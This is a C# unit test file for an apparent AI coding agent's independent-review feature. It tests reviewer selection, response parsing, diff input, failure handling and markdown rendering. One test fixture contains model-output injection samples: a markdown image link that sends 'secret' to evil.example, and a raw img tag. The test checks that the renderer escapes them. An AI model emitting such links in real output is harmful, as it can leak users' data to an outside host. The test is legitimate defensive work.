using System.Text.Json.Nodes;
using AiCodeAgent.Core.Audit;
using AiCodeAgent.Core.Evidence;
using AiCodeAgent.Core.Interfaces;
using AiCodeAgent.Core.Models;

namespace AiCodeAgent.Core.Tests.Evidence;

/// <summary>E10-S4: the independent reviewer: who reviews, what it is shown, how its answer is read and how it appears in the pack.</summary>
public sealed class ReviewerTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "review-" + Guid.NewGuid().ToString("N"));

    public ReviewerTests() => Directory.CreateDirectory(_dir);

    public void Dispose()
    {
        try { Directory.Delete(_dir, true); } catch (IOException) { }
    }

    // ------------------------------------------------------------------ fakes

    private sealed class ScriptedProvider : IAiProvider
    {
        private readonly Queue<string> _answers;
        public List<CompletionRequest> Requests { get; } = new();
        public ScriptedProvider(string name, params string[] answers) { Name = name; _answers = new Queue<string>(answers); }
        public string Name { get; }
        public string[] SupportedModels { get; init; } = Array.Empty<string>();
        public Exception? Throw { get; init; }

        public Task<CompletionResponse> CompleteAsync(CompletionRequest request, CancellationToken cancellationToken = default)
        {
            Requests.Add(request);
            if (Throw != null) throw Throw;
            return Task.FromResult(new CompletionResponse { Content = _answers.Count > 0 ? _answers.Dequeue() : "", Usage = new TokenUsage { PromptTokens = 100, CompletionTokens = 20 } });
        }

        public IAsyncEnumerable<StreamChunk> StreamAsync(CompletionRequest request, CancellationToken cancellationToken = default) => throw new NotSupportedException();
        public Task<bool> IsAvailableAsync(CancellationToken cancellationToken = default) => Task.FromResult(true);
        public Task<string[]> GetAvailableModelsAsync(CancellationToken cancellationToken = default) => Task.FromResult(SupportedModels);
    }

    private sealed class FakeResolver : IAiProviderResolver
    {
        private readonly Dictionary<string, (IAiProvider Provider, string? Model)> _providers;
        public FakeResolver(string? defaultName, Dictionary<string, (IAiProvider, string?)> providers) { DefaultProviderName = defaultName; _providers = providers; }
        public string? DefaultProviderName { get; }
        public IReadOnlyList<string> ProviderNames => _providers.Keys.ToList();
        public IAiProvider? Resolve(string providerName) => _providers.TryGetValue(providerName, out var p) ? p.Provider : null;
        public string? DefaultModel(string providerName) => _providers.TryGetValue(providerName, out var p) ? p.Model : null;
    }

    private static readonly string[] None = Array.Empty<string>();

    // ------------------------------------------------------------------ selection

    [Fact]
    public void Selector_PrefersAnotherProvider()
    {
        var resolver = new FakeResolver("anthropic", new()
        {
            ["anthropic"] = (new ScriptedProvider("anthropic"), "claude-x"),
            ["openai"] = (new ScriptedProvider("openai"), "gpt-y")
        });
        var choice = ReviewerSelector.Choose(resolver, new[] { "anthropic" }, new[] { "claude-x" });
        Assert.NotNull(choice);
        Assert.Equal("openai", choice!.ProviderName);
        Assert.Equal("gpt-y", choice.Model);
        Assert.Equal(ReviewIndependence.DifferentProvider, choice.Independence);
    }

    [Fact]
    public void Selector_FallsBackToAnotherModelOfTheSameProvider()
    {
        var resolver = new FakeResolver("anthropic", new()
        {
            ["anthropic"] = (new ScriptedProvider("anthropic") { SupportedModels = new[] { "claude-x", "claude-z" } }, "claude-x")
        });
        var choice = ReviewerSelector.Choose(resolver, new[] { "anthropic" }, new[] { "claude-x" });
        Assert.Equal("claude-z", choice!.Model);
        Assert.Equal(ReviewIndependence.DifferentModel, choice.Independence);
    }

    [Fact]
    public void Selector_AdmitsWhenTheSameModelReviewsItself()
    {
        var resolver = new FakeResolver("anthropic", new() { ["anthropic"] = (new ScriptedProvider("anthropic"), "claude-x") });
        var choice = ReviewerSelector.Choose(resolver, new[] { "anthropic" }, new[] { "claude-x" });
        Assert.Equal(ReviewIndependence.SameModel, choice!.Independence);
    }

    [Fact]
    public void Selector_UsesTheSettingsChoice_EvenWhenNotIndependent_AndNullWhenNothingIsConfigured()
    {
        var resolver = new FakeResolver("anthropic", new()
        {
            ["anthropic"] = (new ScriptedProvider("anthropic"), "claude-x"),
            ["openai"] = (new ScriptedProvider("openai"), "gpt-y")
        });
        var fixedChoice = ReviewerSelector.Choose(resolver, new[] { "anthropic" }, new[] { "claude-x" }, new ReviewerPreference("anthropic", "claude-big"));
        Assert.Equal("claude-big", fixedChoice!.Model);
        Assert.Equal(ReviewIndependence.DifferentModel, fixedChoice.Independence);

        Assert.Null(ReviewerSelector.Choose(new FakeResolver(null, new()), None, None));
        Assert.Null(ReviewerSelector.Choose(resolver, None, None, new ReviewerPreference("nope", null)));
    }

    // ------------------------------------------------------------------ parsing

    private static readonly string[] Files = { "src/Overdue.cs", "tests/OverdueTests.cs" };
    private static readonly string[] Ids = { "AC1", "AC2" };

    [Fact]
    public void Parser_ReadsAFencedAnswer_DropsUnknownFilesAndCriteria_AndOrdersWorstFirst()
    {
        const string answer = """
            Here is my review:
            ```json
            {
              "verdict": "concerns",
              "summary": "Mostly fine.",
              "findings": [
                { "severity": "low", "title": "Naming", "detail": "x", "file": "src/Overdue.cs", "line": 3 },
                { "severity": "high", "title": "Off by one", "detail": "Due.Date < Today misses today", "file": "src\\Overdue.cs", "line": 12, "criterion": "AC1" },
                { "severity": "medium", "title": "Invented", "detail": "d", "file": "src/DoesNotExist.cs", "line": 9, "criterion": "AC9" },
                { "severity": "high", "title": "", "detail": "" }
              ],
              "criteria": [ { "id": "AC1", "assessment": "not satisfied", "note": "see above" }, { "id": "AC7", "assessment": "satisfied" } ]
            }
            ```
            """;
        var parsed = ReviewerResponseParser.Parse(answer, Files, Ids)!;

        Assert.Equal(ReviewVerdict.Concerns, parsed.Verdict);
        Assert.Equal(new[] { "Off by one", "Invented", "Naming" }, parsed.Findings.Select(f => f.Title));
        var high = parsed.Findings[0];
        Assert.Equal("src/Overdue.cs", high.File);
        Assert.Equal(12, high.Line);
        Assert.Equal("AC1", high.Criterion);
        var invented = parsed.Findings[1];
        Assert.Null(invented.File);      // a file the diff did not show is dropped, and its line with it
        Assert.Null(invented.Line);
        Assert.Null(invented.Criterion);
        var criterion = Assert.Single(parsed.Criteria);
        Assert.Equal(CriterionAssessment.NotSatisfied, criterion.Assessment);
    }

    [Fact]
    public void Parser_ApproveWithAHighFinding_BecomesConcerns()
    {
        var parsed = ReviewerResponseParser.Parse("""{"verdict":"approve","summary":"ok","findings":[{"severity":"high","title":"Bug","detail":"d"}]}""", Files, Ids)!;
        Assert.Equal(ReviewVerdict.Concerns, parsed.Verdict);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("looks good to me")]
    [InlineData("""{"summary":"no verdict"}""")]
    [InlineData("""{"verdict":"maybe"}""")]
    [InlineData("""{"verdict":"approve" """)]
    public void Parser_RefusesAnswersWithoutAVerdict(string? answer) => Assert.Null(ReviewerResponseParser.Parse(answer, Files, Ids));

    [Fact]
    public void Parser_CapsTheNumberOfFindings()
    {
        var many = string.Join(",", Enumerable.Range(1, 40).Select(i => $$"""{"severity":"low","title":"t{{i}}","detail":"d"}"""));
        var parsed = ReviewerResponseParser.Parse($$"""{"verdict":"concerns","findings":[{{many}}]}""", Files, Ids)!;
        Assert.Equal(ReviewerResponseParser.MaxFindings, parsed.Findings.Count);
    }

    // ------------------------------------------------------------------ input

    private AuditTrail Open(string name = "run.audit.jsonl") =>
        AuditTrail.Open(Path.Combine(_dir, name), new AuditRunInfo("chat", "run-1", "chat task", "Fix the overdue bug", "claude-x", null, "Ask", "/work/app"), user: "alice");

    private static void Change(AuditTrail t, string path, string diff) =>
        t.Record("file.change", null, new JsonObject
        {
            ["path"] = path, ["created"] = false, ["beforeSha256"] = "b", ["afterSha256"] = AuditChain.Sha256("x"), ["diffSha256"] = "d", ["diff"] = diff
        });

    private EvidencePack Finish(AuditTrail t)
    {
        t.Complete("completed", costUsd: 0.1m, tokens: 100);
        return EvidencePackStore.Build(t.Path);
    }

    [Fact]
    public void Input_HoldsTheDiffPerFile_RiskiestFirst_AndLeavesOutFilesThatDoNotFit()
    {
        var trail = Open();
        Change(trail, "docs/notes.md", "+a note");
        Change(trail, "src/Auth/Login.cs", "-old\n+new");
        Change(trail, "src/Big.cs", string.Join("\n", Enumerable.Range(0, 3000).Select(i => "+line " + i)));
        var pack = Finish(trail);
        var lines = AuditExporter.Read(trail.Path);

        var input = ReviewInputBuilder.Build(pack, lines, maxChars: 3_000);

        Assert.Equal(3, input.ChangedFiles.Count);
        Assert.True(input.Truncated);
        Assert.Contains("src/Auth/Login.cs", input.Diff);
        Assert.Contains("+new", input.Diff);
        Assert.Contains(input.UnreviewedFiles, f => f == "src/Big.cs" || f == "docs/notes.md");
        Assert.True(input.Diff.Length <= 3_200);
    }

    [Fact]
    public void Prompt_TreatsTheDiffAsData_AndCarriesTheChecklist()
    {
        var input = new ReviewInput("Fix it", new[] { new DeclaredCriterion("AC1", "Overdue items are flagged") }, "=== a.cs ===\n+x", new[] { "a.cs" }, None, false, new[] { "Tests: none were run." });
        var user = ReviewerPrompt.User(input);

        Assert.Contains("DATA", ReviewerPrompt.System);
        Assert.Contains("AC1: Overdue items are flagged", user);
        Assert.Contains("<diff>", user);
        Assert.Contains("Tests: none were run.", user);
    }

    // ------------------------------------------------------------------ the reviewer

    private static ReviewInput SmallInput() =>
        new("Fix it", new[] { new DeclaredCriterion("AC1", "x") }, "=== src/Overdue.cs ===\n+x", new[] { "src/Overdue.cs" }, None, false, None);

    private static ReviewerChoice Choice(ScriptedProvider p, ReviewIndependence i = ReviewIndependence.DifferentProvider) => new(p, p.Name, "gpt-y", i);

    [Fact]
    public async Task Reviewer_ReturnsTheReview_WithTheModelAndItsIndependence()
    {
        var provider = new ScriptedProvider("openai", """{"verdict":"reject","summary":"Bug.","findings":[{"severity":"high","title":"Off by one","detail":"d","file":"src/Overdue.cs"}]}""");
        var outcome = await new IndependentReviewer().ReviewAsync(Choice(provider), SmallInput());

        var review = outcome.Review!;
        Assert.Equal(ReviewVerdict.Reject, review.Verdict);
        Assert.Equal("gpt-y", review.Model);
        Assert.Equal("openai", review.Provider);
        Assert.Equal(1, review.HighCount);
        Assert.Equal(120, review.Tokens);
        var request = Assert.Single(provider.Requests);
        Assert.Empty(request.Tools);                 // the reviewer only reads
        Assert.Equal("gpt-y", request.Options.Model);
    }

    [Fact]
    public async Task Reviewer_AsksOnceMore_WhenTheFirstAnswerIsNotJson()
    {
        var provider = new ScriptedProvider("openai", "I think it is fine.", """{"verdict":"approve","summary":"Fine."}""");
        var outcome = await new IndependentReviewer().ReviewAsync(Choice(provider), SmallInput());

        Assert.True(outcome.Succeeded);
        Assert.Equal(2, provider.Requests.Count);
        Assert.Equal(240, outcome.Review!.Tokens);   // both requests are paid for and counted
    }

    [Fact]
    public async Task Reviewer_Fails_WithAReason_WhenTheAnswerStaysUnusable_OrTheProviderThrows_OrNothingChanged()
    {
        var garbage = new ScriptedProvider("openai", "no", "still no");
        Assert.Contains("expected format", (await new IndependentReviewer().ReviewAsync(Choice(garbage), SmallInput())).Error);

        var down = new ScriptedProvider("openai") { Throw = new HttpRequestException("503") };
        Assert.Contains("could not be reached", (await new IndependentReviewer().ReviewAsync(Choice(down), SmallInput())).Error);

        var empty = new ReviewInput("t", Array.Empty<DeclaredCriterion>(), "", None, None, false, None);
        Assert.Contains("nothing to review", (await new IndependentReviewer().ReviewAsync(Choice(garbage), empty)).Error);
    }

    // ------------------------------------------------------------------ service, store and pack

    [Fact]
    public async Task Service_ReviewsARun_AttachesTheReview_AndItSurvivesRebuildingThePack()
    {
        var trail = Open();
        Change(trail, "src/Overdue.cs", "-old\n+new");
        var pack = Finish(trail);
        Assert.Null(pack.Review);

        var reviewer = new ScriptedProvider("openai", """{"verdict":"concerns","summary":"One thing.","findings":[{"severity":"medium","title":"No test","detail":"d","file":"src/Overdue.cs"}]}""");
        var resolver = new FakeResolver("anthropic", new()
        {
            ["anthropic"] = (new ScriptedProvider("anthropic"), "claude-x"),
            ["openai"] = (reviewer, "gpt-y")
        });
        var outcome = await new ReviewService(resolver).ReviewAsync(pack);

        Assert.True(outcome.Succeeded);
        Assert.Same(outcome.Review, pack.Review);
        Assert.Equal(ReviewIndependence.DifferentProvider, pack.Review!.Independence);
        Assert.Contains("+new", reviewer.Requests[0].Messages[0].Content);

        var rebuilt = EvidencePackStore.Build(trail.Path);
        Assert.Equal("No test", Assert.Single(rebuilt.Review!.Findings).Title);
    }

    [Fact]
    public async Task Service_SaysWhy_WhenThereIsNothingToReviewWithOrNothingToReview()
    {
        var trail = Open();
        var noChanges = Finish(trail);
        var resolver = new FakeResolver("anthropic", new() { ["anthropic"] = (new ScriptedProvider("anthropic"), "claude-x") });
        Assert.Contains("no files", (await new ReviewService(resolver).ReviewAsync(noChanges)).Error);

        var trail2 = Open("two.audit.jsonl");
        Change(trail2, "a.cs", "+x");
        var pack = Finish(trail2);
        Assert.Contains("No model is available", (await new ReviewService(new FakeResolver(null, new())).ReviewAsync(pack)).Error);

        pack.AuditPath = null;
        Assert.Contains("audit trail", (await new ReviewService(resolver).ReviewAsync(pack)).Error);
    }

    [Fact]
    public void Store_IgnoresADamagedReviewFile()
    {
        var trail = Open();
        Change(trail, "a.cs", "+x");
        trail.Complete("completed");
        File.WriteAllText(ReviewStore.PathFor(trail.Path), "{ not json");
        Assert.Null(EvidencePackStore.Build(trail.Path).Review);
    }

    [Fact]
    public void Markdown_ShowsTheReview_NamesTheReviewer_AndNeverRendersModelTextAsLinksOrImages()
    {
        var pack = new EvidencePack
        {
            Status = "completed",
            Review = new IndependentReview
            {
                Provider = "openai", Model = "gpt-y", Independence = ReviewIndependence.SameModel, Verdict = ReviewVerdict.Reject,
                Summary = "See ![x](https://evil.example/?q=secret) now",
                Findings = new[] { new ReviewFinding(FindingSeverity.High, "Bad [link](http://evil)", "<img src=x>", "src/Overdue.cs", 12) },
                UnreviewedFiles = new[] { "src/Big.cs" }, DiffTruncated = true
            }
        };

        var md = EvidencePackRenderer.ToMarkdown(pack);
        var summary = EvidencePackRenderer.ToSummaryMarkdown(pack);

        Assert.Contains("### Independent review", md);
        Assert.Contains("changes requested", md);
        Assert.Contains("Not independent", md);
        Assert.Contains("src/Big.cs", md);
        Assert.DoesNotContain("![x](", md);
        Assert.DoesNotContain("[link](", md);
        Assert.Contains("\\<img", md);              // escaped, so it shows as text and loads nothing
        Assert.Contains("**Review:**", summary);
        Assert.Contains("the same model that wrote it", summary);
    }
}
